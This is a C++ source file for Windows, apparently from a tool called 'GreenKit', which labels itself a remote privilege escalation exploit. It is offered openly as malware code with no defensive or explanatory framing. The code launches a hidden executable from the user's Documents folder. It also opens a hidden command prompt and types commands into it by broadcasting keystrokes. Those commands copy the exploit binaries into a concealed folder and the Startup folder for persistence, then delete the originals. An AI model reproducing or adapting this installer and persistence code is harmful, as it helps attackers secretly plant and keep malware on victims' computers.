// Microsoft Windows 57135 Remote Privilege Escalation Vulnerability
#include "stdafx.h"
#include "Infiltration.h"
#include <windows.h>

void RunExploit()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi = { 0 };

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	char profilepath[250];
	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);

	char* exploit_path = strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe");

	si.cb = sizeof(si);
	CreateProcessA(
		NULL,
		exploit_path,
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		"C:\\",
		&si,
		&pi
		);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	TerminateProcess(pi.hProcess, 0);
}

int ExploitME()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi = { 0 };

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	si.cb = sizeof(si);
	CreateProcessA(
		NULL,
		"C:\\Windows\\system32\\cmd.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
		);

	Sleep(1000);
	
    PCHAR copy[] = { "rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder",
        "del \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_Exploit.exe\"",
        "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" /Y",
        "xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /Y",
        "xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" /Y",
        "del _greenkit_Exploit.exe",
        "del _greenkit_GreenKitExe.exe",
        "del _greenkit_GreenKit.dll",
        "exit",
		NULL };

	for (unsigned int i = 0; copy[i] != NULL; ++i)
	{
		for (unsigned int j = 0; j < strlen(copy[i]); ++j)
		{
			SendMessage(
				HWND_BROADCAST,
				WM_CHAR,
				copy[i][j],
				0
				);
		}

		SendMessage(
			HWND_BROADCAST,
			WM_CHAR,
			VK_RETURN,
			0
			);
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	TerminateProcess(pi.hProcess, 0);

	return EXIT_SUCCESS;
}

